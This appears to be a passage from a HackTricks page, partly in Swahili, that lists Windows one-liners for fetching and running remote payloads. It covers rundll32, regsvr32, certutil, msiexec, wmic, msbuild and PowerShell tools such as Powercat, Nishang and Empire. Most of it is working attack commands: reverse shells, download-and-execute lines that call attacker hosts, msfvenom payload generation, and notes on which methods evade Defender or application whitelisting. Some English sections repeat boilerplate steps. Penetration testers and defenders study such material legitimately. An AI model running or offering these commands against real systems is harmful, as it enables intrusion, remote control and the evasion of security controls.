* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Kugunduliwa na mtetezi**

**Rundll32 - sct**

[**Kutoka hapa**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit is a popular framework used for penetration testing and exploiting vulnerabilities. In this section, we will explore how to use Rundll32 with Metasploit for various hacking techniques.

##### **1. Loading a Meterpreter DLL**

To load a Meterpreter DLL using Rundll32 and Metasploit, follow these steps:

1. Generate a Meterpreter DLL payload using Metasploit.
2. Transfer the generated DLL to the target Windows machine.
3. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
4. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the DLL file and `<Entry_Point>` with the entry point function name.

##### **2. Bypassing Application Whitelisting**

Rundll32 can be used to bypass application whitelisting by executing a trusted DLL file. To do this, follow these steps:

1. Identify a trusted DLL file that is allowed by the application whitelisting policy.
2. Rename the malicious DLL to match the name of the trusted DLL.
3. Transfer the malicious DLL to the target machine.
4. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
5. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the trusted DLL file and `<Entry_Point>` with the entry point function name.

##### **3. DLL Hijacking**

DLL hijacking is a technique where an attacker replaces a legitimate DLL file with a malicious one. Rundll32 can be used to execute the malicious DLL. To perform DLL hijacking using Rundll32, follow these steps:

1. Identify a vulnerable application that loads DLL files.
2. Replace a legitimate DLL file with a malicious one.
3. Transfer the malicious DLL to the target machine.
4. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
5. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the malicious DLL file and `<Entry_Point>` with the entry point function name.

##### **4. DLL Side-Loading**

DLL side-loading is a technique where an attacker exploits the way an application loads DLL files. Rundll32 can be used to execute a malicious DLL file during the side-loading process. To perform DLL side-loading using Rundll32, follow these steps:

1. Identify an application that loads DLL files from a specific directory.
2. Place the malicious DLL file in the same directory as the legitimate DLL files.
3. Transfer the malicious DLL to the target machine.
4. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
5. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the malicious DLL file and `<Entry_Point>` with the entry point function name.

By leveraging Rundll32 with Metasploit, you can effectively execute DLL files and exploit vulnerabilities in Windows systems. However, it is important to note that these techniques should only be used for ethical hacking and with proper authorization.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that provides a command and control (C2) framework for Windows systems.

To use Koadic with Rundll32, follow these steps:

1. Generate a payload using Koadic. This payload will be a DLL file that contains the malicious code you want to execute on the target system.

2. Transfer the generated payload to the target system. This can be done using various methods, such as email, USB drives, or exploiting vulnerabilities in the target system.

3. Open a command prompt on the target system and run the following command:

   ```
   rundll32.exe <path_to_payload.dll>,<entry_point_function_name>
   ```

   Replace `<path_to_payload.dll>` with the path to the transferred payload DLL file, and `<entry_point_function_name>` with the name of the function within the DLL that you want to execute.

4. The malicious code within the payload DLL will be executed on the target system, allowing you to perform various post-exploitation activities, such as gaining remote access, exfiltrating data, or escalating privileges.

Note: The use of Rundll32 with Koadic can help evade detection by security tools, as it leverages a legitimate Windows utility for executing the malicious code. However, it is important to note that this technique may still be detected by advanced security solutions.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Kugunduliwa na mtetezi**

#### Regsvr32 -sct

[**Kutoka hapa**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system. In the context of Metasploit, Regsvr32 can be leveraged to bypass security controls and gain unauthorized access to a target.

To use Regsvr32 with Metasploit, follow these steps:

1. Generate a payload using Metasploit's `msfvenom` tool. This payload will be embedded in a DLL file.
2. Transfer the DLL file to the target system.
3. Open a command prompt on the target system and navigate to the directory where the DLL file is located.
4. Execute the following command to register the DLL file: `regsvr32 /s <DLL_filename>`
5. The DLL file will be loaded and executed, providing a backdoor into the target system.

It's important to note that this technique may trigger security alerts, as it involves the execution of an untrusted DLL file. Additionally, it may require administrative privileges on the target system.

This method can be effective for bypassing security controls and gaining access to a target system, but it should be used responsibly and only in authorized penetration testing scenarios.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Unaweza kupakua na kutekeleza kwa urahisi kabisa Koadic zombie kwa kutumia stager regsvr**

## Certutil

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Pakua B64dll, ifanyie uchanganuzi na kuitekeleza.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Pakua B64exe, dekodeza na tekeleza.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Kugunduliwa na mtetezi**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuyatatua haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used for running VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload delivery method. By creating a malicious script using VBScript or JScript and then using Cscript to execute it, an attacker can gain unauthorized access to a target system.

To use Cscript with Metasploit, follow these steps:

1. Generate a malicious script using VBScript or JScript. This script should contain the desired payload or exploit.

2. Save the script with a .vbs or .js extension.

3. Use the `msfvenom` tool in Metasploit to generate a payload that will be executed by the script. Specify the output format as an executable file.

4. Transfer the generated payload to the target system.

5. On the target system, open a command prompt and navigate to the directory where the script and payload are located.

6. Execute the script using the Cscript command. For example, if the script is named `exploit.vbs`, run the following command: `cscript exploit.vbs`.

7. If successful, the payload will be executed on the target system, providing the attacker with the desired access or control.

It is important to note that using Cscript with Metasploit or any other hacking technique without proper authorization is illegal and unethical. This information is provided for educational purposes only.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Kugunduliwa na mtetezi**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Mchakato unaoendesha wito wa mtandao: **svchost.exe**\
Payload iliyoandikwa kwenye diski: **Hifadhi ya muda ya mteja wa WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Kugunduliwa na mtetezi**

## **MSIExec**

Mshambuliaji
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Mlengwa:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Imegunduliwa**

## **Wmic**

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Faili la mfano la xsl [kutoka hapa](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Haijagunduliwa**

**Unaweza kupakua na kutekeleza kwa urahisi kabisa kiumbe cha Koadic kwa kutumia stager wmic**

## Msbuild

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Unaweza kutumia mbinu hii kukiuka orodha nyeupe ya programu na vizuizi vya Powershell.exe. Kwa kuwa utaulizwa na kichupi cha PS.\
Pakua tu na tekeleza hii: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Haijagunduliwa**

## **CSC**

Kusanya kificho cha C# kwenye kifaa cha mwathiriwa.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Unaweza kupakua kifaa cha kurudisha nyuma cha C# cha msingi kutoka hapa: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Hakijagunduliwa**

## **Regasm/Regsvc**

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Sijajaribu**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Sijajaribu**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Poweshell Maboya

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Katika folda ya **Maboya**, kuna maboya mengi tofauti. Ili kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_, fanya nakala ya hati na ongeza mwishoni mwa faili:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Anza kuhudumia skripti kwenye seva ya wavuti na itekeleze kwenye kifaa cha mwathirika:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Mlinzi haidhinishi kama ni namna ya kificho yenye nia mbaya (bado, 3/04/2019).

**TODO: Angalia mabakuli mengine ya nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Pakua, anzisha seva ya wavuti, anzisha msikilizaji, na tekeleza kwenye mwisho wa muathiriwa:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Mlinzi haidhinishi kama ni msimbo mbaya (bado, 3/04/2019).

**Chaguzi nyingine zinazotolewa na powercat:**

Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Tengeneza kizinduzi cha powershell, iweke kwenye faili na idownload na kuitekeleza.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Imepatikana kama nambari ya hatari**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Tengeneza toleo la powershell la mlango wa nyuma wa metasploit kwa kutumia unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Anza msfconsole na rasilimali iliyoumbwa:
```
msfconsole -r unicorn.rc
```
Anza seva ya wavuti inayohudumia faili ya _powershell\_attack.txt_ na tekeleza kwenye mwathiriwa:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Imepatikana kama nambari ya hatari**

## Zaidi

[PS>Shambulio](https://github.com/jaredhaight/PSAttack) Konsoli ya PS na moduli za PS zenye mashambulizi (zilizofichwa)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Konsoli ya PS na moduli za PS zenye mashambulizi na uchunguzi wa wakala (IEX)

## Marejeo

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa API hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha** [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
